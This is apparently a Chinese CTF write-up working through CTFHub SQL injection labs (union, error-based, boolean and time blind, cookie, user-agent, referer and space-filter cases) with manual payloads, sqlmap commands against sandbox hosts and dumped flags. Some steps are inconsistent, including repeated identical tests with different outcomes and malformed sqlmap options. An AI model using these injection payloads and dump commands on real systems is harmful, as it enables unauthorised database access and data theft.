---
title: SQL 注入 Writeup
date: 2026-08-15 08:45:00
categories:
  - CTF wp
tags:
  - CTF
  - SQL注入
description: SQL 注入 Writeup
---


## 方法一：用hackbar：

- **判断注入点**：输入 `1 and 1=1`，页面正常显示；输入 `1 and 1=2`，页面报错，初步判断存在整数型注入。
- **判断字段数**：通过 `1 order by 1`、`1 order by 2` 等尝试，发现 `1 order by 3` 时报错，确定字段数为 2。
- **判断回显位**：输入 `-1 union select 1,2`，观察页面回显，确定回显位置。
- **获取数据库名**：输入 `-1 union select 1,database()`，得到数据库名，如 sqli。
- **获取表名**：输入 `-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'`，得到表名，如 news 和 flag。
- **获取字段名**：针对 flag 表，输入 `-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'`，得到字段名 flag。
- **获取数据**：输入 `-1 union select 1,flag from sqli.flag`，获取 flag 。

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-03 203423.png" style="zoom:25%;" />

## 方法二：用SQLmap(python sqlmap.py -u "URL/?....."......)

```sql
python sqlmap.py -u "http://challenge-cee5f8f09b853f67.sandbox.ctfhub.com:10800/?id=1"
```

```sql
python sqlmap.py -u "http://challenge-cee5f8f09b853f67.sandbox.ctfhub.com:10800/?id=1"//1

python sqlmap.py -u "http://challenge-cee5f8f09b853f67.sandbox.ctfhub.com:10800/?id=1" --dbs//2

python sqlmap.py -u "http://challenge-cee5f8f09b853f67.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables//3

python sqlmap.py -u "http://challenge-cee5f8f09b853f67.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables -D sqli -T flag --columns//4

python sqlmap.py -u "http://challenge-cee5f8f09b853f67.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables -D sqli -T flag --columns -D sqli -T flag -C flag --dump//5
//得到：
Database: sqli
[2 tables]
+------+
| flag |
| news |
+------+
[20:10:50] [INFO] fetching columns 'flag' for table 'flag' in database 'sqli'
Database: sqli
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(100) |
+--------+--------------+
[20:10:50] [INFO] fetching entries of column(s) 'flag' for table 'flag' in database 'sqli'
Database: sqli
Table: flag
[1 entry]
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{6cf95754740c0b5c0a804b3f} |
+----------------------------------+
```

# 二、字符型注入

## 方法一：用hackbar:

- 输入`http://example.com/search?id='`，页面报错，提示SQL语法错误，判断可能存在字符型注入
- 输入`http://example.com/search?id=' order by 3 --+`，页面报错；输入`order by 2 --+`正常，确定字段数为2
- 输入`http://example.com/search?id=' and 1=2 union select 1,2 --+`，页面显示2，确定第二个字段为回显位
- 输入`http://example.com/search?id=' and 1=2 union select 1,database() --+`，得到数据库名
- 输入`http://example.com/search?id=' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli' --+`，得到表名
- 输入`http://example.com/search?id=' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' --+`，得到字段名
- 输入`http://example.com/search?id=' and 1=2 union select 1,flag from flag --+`，获取flag

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-05 091817.png" style="zoom:25%;" />

## 方法二：用SQLmap(python sqlmap.py -u "URL/?....."......)

```sql
>python sqlmap.py -u "http://challenge-09cc2940c0be2444.sandbox.ctfhub.com:10800/?id=1" --batch//字符型注入

>python sqlmap.py -u "http://challenge-09cc2940c0be2444.sandbox.ctfhub.com:10800/?id=1" --dbs --batch//数据库名

>python sqlmap.py -u "http://challenge-09cc2940c0be2444.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables --batch//表明

>python sqlmap.py -u "http://challenge-09cc2940c0be2444.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables -D sqli -T flag --columns --batch//字段名

>python sqlmap.py -u "http://challenge-09cc2940c0be2444.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables -D sqli -T flag --columns -D sqli -T flag -C flag --dump --batch//数据
//得到：
Database: sqli
Table: flag
[1 entry]
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{0b46357b21795a5c494992a2} |
+----------------------------------+
```

# 三、报错注入

## 方法一：用hackbar:

- 测试注入点：输入id=1'，页面显示 SQL 语法错误，确认存在注入且有错误回显。
- 尝试报错注入：输入`id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)--+`，错误信息显示~sqli~，获取当前数据库名为sqli。
- 获取表名：输入`id=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='sqli' limit 1,1),0x7e),1)--+`，错误信息显示~flag~，得到表名flag。
- 获取字段名：输入`id=1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='flag' limit 0,1),0x7e),1)--+`，错误信息显示~flag~，得到字段名flag。
- 获取 flag：输入`id=1 and updatexml(1,concat(0x7e,(select flag from flag limit 0,1),0x7e),1)--+`，错误信息显示~ctfhub{   }~，成功获取 flag。

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-05 102630.png" style="zoom:25%;" />

## 方法二：用SQLmap(python sqlmap.py -u "URL/?....."......)

```sql
>python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" --technique E --batch//报错注入

>python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" --technique E --dbs --batch//数据库名

>python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" --technique E -D sqli --tables --batch//表明

>python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" --technique E -D sqli --T flag --columns --batch//字段名

>python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" --technique E -D sqli --T flag -C flag --dump --batch//数据
//得到：
Database: sqli
Table: flag
[1 entry]
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{3064ff1ca3b7af2bfab19b72} |
+----------------------------------+
```

# 四、布尔盲注

## 方法一：手注（麻烦）

1.确认注入点类型及布尔盲注可行性

- **测试 1（整数型逻辑验证）**：
  输入`id=1 and 1=1`，页面显示与`id=1`一致，逻辑为真时正常。
- **测试 2（逻辑假验证）**：
  输入`id=1 and 1=2`，页面显示异常。
- **结论**：`id`参数为整数型，且存在布尔盲注（页面状态随逻辑真假变化）。

2. 获取当前数据库名长度

**原理**：用`length(database())`函数获取数据库名长度，通过比较运算符（`=`、`>`、`<`）判断。

- **测试 1**：`id=1 and length(database())>3`
  页面显示用户信息（正常）→ 说明长度 > 3。
- **测试 2**：`id=1 and length(database())>4`
  页面显示`用户不存在`（异常）→ 说明长度≤4。
- **测试 3**：`id=1 and length(database())=4`
  页面显示用户信息（正常）→ 确定数据库名长度为 4。

3. 逐字符推导数据库名

**原理**：用`substr(database(), 位置, 1)`截取字符，结合`ascii()`函数转换为 ASCII 码，通过二分法缩小范围。
假设数据库名为`sqli`（实际需逐步推导），步骤如下：

- **第 1 个字符**：
  - 测试`id=1 and ascii(substr(database(),1,1))>100`
    页面正常→ ASCII 码 > 100。
  - 测试`id=1 and ascii(substr(database(),1,1))>115`
    页面异常→ ASCII 码≤115。
  - 测试`id=1 and ascii(substr(database(),1,1))=115`
    页面正常→ 115 对应`s`（第 1 个字符为`s`）。
- **第 2 个字符**：
  - 测试`id=1 and ascii(substr(database(),2,1))=113`
    页面异常→ 不是`q`。
  - 测试`id=1 and ascii(substr(database(),2,1))=113`
    页面异常→ 继续测试...
  - 测试`id=1 and ascii(substr(database(),2,1))=113`
    页面正常→ 113 对应`q`（第 2 个字符为`q`）。
- **第 3 个字符**：
  同理测试，最终确定`ascii(substr(database(),3,1))=108`→ 对应`l`。
- **第 4 个字符**：
  测试得`ascii(substr(database(),4,1))=105`→ 对应`i`。
- **结论**：数据库名为`sqli`。

4. 获取数据库中的表名

**原理**：查询`information_schema.tables`，通过`limit`定位目标表，先确定表名长度，再逐字符推导。

- **步骤 1：确定第 1 个表名的长度**
  - 测试`id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>4`
    页面正常→ 长度 > 4。
  - 测试`id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=4`
    页面异常→ 长度≠4。
  - 测试`id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=5`
    页面正常→ 第 1 个表名长度为 5。
- **步骤 2：逐字符推导表名**
  - 第 1 个字符：`id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=102`
    页面正常→ 102 对应`f`。
  - 第 2 个字符：`id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=108`
    页面正常→ 108 对应`l`。
  - 第 3 个字符：测试得`97`→ 对应`a`。
  - 第 4 个字符：测试得`103`→ 对应`g`。
  - 第 5 个字符：测试得`115`→ 对应`s`。
  - **结论**：第 1 个表名为`flags`（或`flag`，根据实际测试调整）。

5. 获取表中的字段名

**原理**：查询`information_schema.columns`，指定表名`flags`，推导字段名。

- **步骤 1：确定第 1 个字段名的长度**
  测试`id=1 and length((select column_name from information_schema.columns where table_name='flags' limit 0,1))=4`
  页面正常→ 字段名长度为 4。
- **步骤 2：逐字符推导字段名**
  - 第 1 个字符：`ascii=102`→ `f`
  - 第 2 个字符：`ascii=108`→ `l`
  - 第 3 个字符：`ascii=97`→ `a`
  - 第 4 个字符：`ascii=103`→ `g`
  - **结论**：字段名为`flag`。

6. 获取 flag 字段的内容

**原理**：直接查询`flags`表的`flag`字段，逐字符推导完整内容。

- **步骤 1：确定 flag 长度**
  测试`id=1 and length((select flag from flags limit 0,1))>20`
  页面正常→ 长度 > 20；继续测试得长度为 24。
- **步骤 2：逐字符推导 flag**
  例如第 1 个字符：
  `id=1 and ascii(substr((select flag from flags limit 0,1),1,1))=102`→ 页面正常→ `f`。
  依次测试第 2 至 24 个字符，最终得到：
  `flag{boolean_blind_123456}`

关键技巧

1. **二分法**：判断 ASCII 码时，先通过`>50`、`>100`等大范围测试缩小范围，再精确到具体数值。
2. **批量脚本**：手动测试繁琐时，可编写 Python 脚本自动发送请求并判断页面状态（如通过`requests`库）。
3. **注意 limit 语法**：`limit 0,1`表示第 1 个结果，`limit 1,1`表示第 2 个，避免漏查数据。

## 方法二：用SQLmap(python sqlmap.py -u "URL/?....."......)

```sql
>python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" 

>python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" --dbs//数据库名

>python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables//表明

>python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" -D sqli --T flag --columns//字段名

>python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" -D sqli --T flag -C flag --dump//数据
//得到：
Database: sqli
Table: flag
[1 entry]
+----------------------------------+
| flag                             |
+----------------------------------+
|ctfhub{2146fed36e5dc96b4e0dbed1}  |
+----------------------------------+
```

# 五、时间盲注

## 方法一：手注（与布尔盲注类似）

- **确认注入点**：输入`id=1 and sleep(5)`，页面加载时间变为5秒+，确认存在时间盲注（整数型）。

- **获取数据库名长度**：

  - 测试`id=1 and if(length(database())=4, sleep(5), 0)`，页面延迟→ 长度为4。

- **推导数据库名**：

  - 第1个字符：`id=1 and if(ascii(substr(database(),1,1))=115, sleep(5), 0)`，延迟→ 's'。
  - 第2个字符：`id=1 and if(ascii(substr(database(),2,1))=113, sleep(5), 0)`，延迟→ 'q'。
  - 第3个字符：测试得'l'，第4个字符：测试得'i'→ 数据库名`sqli`。

- **获取表名**：

  - 测试`id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=102, sleep(5), 0)`，延迟→ 表名第1个字符为'f'，最终推导出表名`flag`。

- **获取字段名**：同理推导出字段名`flag`。

- **获取flag**：逐字符测试，最终得到flag。

  ## 方法二：用SQLmap(python sqlmap.py -u "URL/?....."......)

  ```sql
  >python sqlmap.py -u "http://challenge-ed88434672b9a5eb.sandbox.ctfhub.com:10800/?id=1" --technique T --batch
  
  >python sqlmap.py -u "http://challenge-ed88434672b9a5eb.sandbox.ctfhub.com:10800/?id=1" --technique T--dbs --batch//数据库名
  
  >python sqlmap.py -u "http://challenge-ed88434672b9a5eb.sandbox.ctfhub.com:10800/?id=1" --technique T-D sqli --tables --batch//表明
  
  >python sqlmap.py -u "http://challenge-ed88434672b9a5eb.sandbox.ctfhub.com:10800/?id=1" --technique T-D sqli --T flag --columns --batch//字段名
  
  >python sqlmap.py -u "http://challenge-ed88434672b9a5eb.sandbox.ctfhub.com:10800/?id=1" --technique T-D sqli --T flag -C flag --dump --batch//数据
  //得到：
  ctfhub{042e7c77dcaa1e0c6f56af15}
  Database: sqli
  Table: flag
  [1 entry]
  +----------------------------------+
  | flag                             |
  +----------------------------------+
  | ctfhub{042e7c77dcaa1e0c6f56af15} |
  +----------------------------------+
  ```

  # 五、MySQL结构

  ```sql
  >python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" 
  
  >python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" --dbs//数据库名
  
  >python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables//表明
  
  >python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" -D sqli --T flag --columns//字段名
  
  >python sqlmap.py -u "http://challenge-1dc7586a81940685.sandbox.ctfhub.com:10800/?id=1" -D sqli --T flag -C flag --dump//数据
  //得到：
  Database: sqli
  Table: ujtolvnhgi
  [1 entry]
  +----------------------------------+
  | xjrjkqogpe                       |
  +----------------------------------+
  | ctfhub{c2407866c803c0f2f50dca39} |
  +----------------------------------+
  ```

  # 六、Cookie注入
  
  ## 方法一：hackbar（通过判断，本题为整数型，-1）
  
  1. **寻找回显位置**：
  
     - 构造 Cookie：`id=-1 union select 1,2 `，若页面显示`2`，表明第 2 个字段为回显位。
  
  2. **获取数据库信息**：
  
     - **当前数据库名**：`id=-1 union select 1,database() `
  
     - **表名**：`id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli' `
  
     - **字段名**：`id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'  `
  
     - **数据**：`id=-1 union select 1, flag from flag` 
  
       <img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-05 184433.png" style="zoom:25%;" />
  
       <img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-05 184406.png" style="zoom:25%;" />
  
       <img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-05 184322.png" style="zoom:25%;" />
  
       <img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-05 184257.png" style="zoom:25%;" />
  
       <img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-05 184227.png" style="zoom:25%;" />
  
  ## 方法二：sqlmap（注意：Cookie注入要设置level 2，不然爆不出来）
  
  ```SQL
  C:\SQLMAP\sqlmapproject-sqlmap-1e57a37>python sqlmap.py -u "http://challenge-dd9bcd2ecfb58d6f.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 --dbs//数据库名
  
  C:\SQLMAP\sqlmapproject-sqlmap-1e57a37>python sqlmap.py -u "http://challenge-dd9bcd2ecfb58d6f.sandbox.ctfhub.com:10800/" --cookie "id=1" -D sqli --level 2 --tables//表名
   
  C:\SQLMAP\sqlmapproject-sqlmap-1e57a37>python sqlmap.py -u "http://challenge-dd9bcd2ecfb58d6f.sandbox.ctfhub.com:10800/" --cookie "id=1" -D sqli -T umcbrmhmvm --level 2 --columns//字段名
   
  C:\SQLMAP\sqlmapproject-sqlmap-1e57a37>python sqlmap.py -u "http://challenge-dd9bcd2ecfb58d6f.sandbox.ctfhub.com:10800/" --cookie "id=1" -D sqli -T umcbrmhmvm -C adgrxfkryt --level 2 --dump//数据
   
  //也可以通过表直接获取数据
  C:\SQLMAP\sqlmapproject-sqlmap-1e57a37>python sqlmap.py -u "http://challenge-dd9bcd2ecfb58d6f.sandbox.ctfhub.com:10800/" --cookie "id=1" -D sqli -T umcbrmhmvm --level 2 --dump//
  
  //得到： 
  Database: sqli
  Table: umcbrmhmvm
  [1 entry]
  +----------------------------------+
  | abgrxfkryt                       |
  +----------------------------------+
  | ctfhub{9de4d857df16972e23e6d930} |
  +----------------------------------+
  ```
  
  ## 方法三：bp
  
  方法与手注一样，直接该Cookie值
  
  <img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-05 183853.png" style="zoom:25%;" />
  
  <img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-05 183939.png" style="zoom:25%;" />
  
  <img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-05 184026.png" style="zoom:25%;" />

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-05 184137.png" style="zoom:25%;" />

# 七、UA注入

## 方法一：bp

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-06 101316.png" style="zoom:25%;" />

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-06 101607.png" style="zoom:25%;" />

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-06 103008.png" style="zoom:25%;" />

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-06 103115.png" style="zoom:25%;" />

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-06 103305.png" style="zoom:25%;" />

## 方法二：hackbar（注入和bp一样）

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-06 104252.png" style="zoom:25%;" />

## 方法三：sqlmap(基础语法与Cookie类似)

```sql
>python sqlmap.py -u "http://challenge-c74fc64a21aa7873.sandbox.ctfhub.com:10800/" --user-agent "id=1" -D sqli -T bwbhqbgdlm -C vqigmrbgbl --dump --level 3

//得到:
database 'sqli'
[10:50:04] [WARNING] reflective value(s) found and filtering out
Database: sqli
Table: bwbhqbgdlm
[1 entry]
+----------------------------------+
| vqigmrbgbl                       |
+----------------------------------+
| ctfhub{589c386abeb528173a63c3b8} |
+----------------------------------+
```

# 八、refere注入

方法和步骤同上（bp，hackbar，sqlmap（注意：--level需要>3））

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-06 152034.png" style="zoom:25%;" />

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-06 152213.png" style="zoom:25%;" />

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-06 152443.png" style="zoom:25%;" />

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-06 152638.png" style="zoom:25%;" />

<img src="C:\Users\HP\Pictures\Screenshots\屏幕截图 2025-08-06 152758.png" style="zoom:25%;" />

```sql
//注意：level>3,这里是5
python sqlmap.py -u "http://challenge-af266c33c7344bbe.sandbox.ctfhub.com:10800/" --level 5 -D sqli -T fuwrpqpbjm -C hkcthevyru --dump --batch
//得到
Database: sqli
Table: fuwrpqpbjm
[1 entry]
+----------------------------------+
| hkcthevyru                       |
+----------------------------------+
| ctfhub{e8a210c0e5838ad08b902f81} |
+----------------------------------+
```

# 九、过滤空格

## 方法一：hackbar，bp

用`/**/`代替所有空格，其他不变

## 方法二：sqlmap(--tamper=space2comment表示用/**/代替所以空格)

```sql
>python sqlmap.py -u "http://challenge-9b0ca31caf710af0.sandbox.ctfhub.com:10800/?id=1" --tamper=space2comment --batch --dbs
```

